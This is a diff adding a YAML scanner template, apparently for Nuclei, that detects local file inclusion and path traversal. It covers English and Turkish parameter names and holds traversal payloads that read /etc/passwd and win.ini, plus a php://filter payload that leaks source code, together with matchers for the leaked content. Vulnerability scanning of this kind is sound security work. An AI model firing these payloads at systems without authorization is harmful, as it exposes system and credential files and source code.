@@ -1,0 +1,94 @@
+id: lfi-path-traversal
+
+info:
+  name: LFI / Path Traversal Detection (Yerel Dosya Dahil Etme / Dizin Aşımı)
+  author: ertansa
+  severity: high
+  description: |
+    Yaygın dosya-yolu parametrelerine dizin aşımı (path traversal) ve yerel dosya
+    dahil etme (LFI) yükleri enjekte ederek /etc/passwd, Windows win.ini ve
+    php://filter ile kaynak kod sızıntısını tespit eder. İngilizce ve Türkçe
+    parametre adlarını (dosya, sayfa, belge, icerik, indir) birlikte kapsar.
+    -dast gerektirmez (yükler yaygın sorgu parametrelerine eklenir).
+  reference:
+    - https://owasp.org/www-community/attacks/Path_Traversal
+    - https://book.hacktricks.xyz/pentesting-web/file-inclusion
+  classification:
+    cwe-id: CWE-22
+  metadata:
+    max-request: 198
+  tags: lfi,injection,traversal,disclosure
+
+http:
+  - method: GET
+    attack: clusterbomb
+    payloads:
+      param:
+        - "file"
+        - "page"
+        - "path"
+        - "template"
+        - "doc"
+        - "document"
+        - "folder"
+        - "pg"
+        - "include"
+        - "inc"
+        - "lang"
+        - "dir"
+        - "download"
+        - "read"
+        - "view"
+        - "name"
+        - "p"
+        # Türkçe parametre adları
+        - "dosya"
+        - "sayfa"
+        - "belge"
+        - "icerik"
+        - "indir"
+      lfi:
+        - "/etc/passwd"
+        - "../../../../../../../../etc/passwd"
+        - "....//....//....//....//....//etc/passwd"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        - "/etc/passwd%00"
+        - "../../../../../../../../windows/win.ini"
+        - "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+        - "php://filter/convert.base64-encode/resource=index.php"
+    path:
+      - "{{BaseURL}}?{{param}}={{lfi}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: unix-passwd
+        part: body
+        regex:
+          - "root:.*?:0:0:"
+          - "(bin|daemon|nobody):.*?:\\d+:\\d+:"
+
+      - type: word
+        name: windows-ini
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "[extensions]"
+          - "[fonts]"
+        condition: and
+
+      - type: word
+        name: php-source-base64
+        part: body
+        words:
+          - "PD9waHA"        # base64("<?php")
+          - "PD9waHAK"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*?:0:0:[^\\n]+"
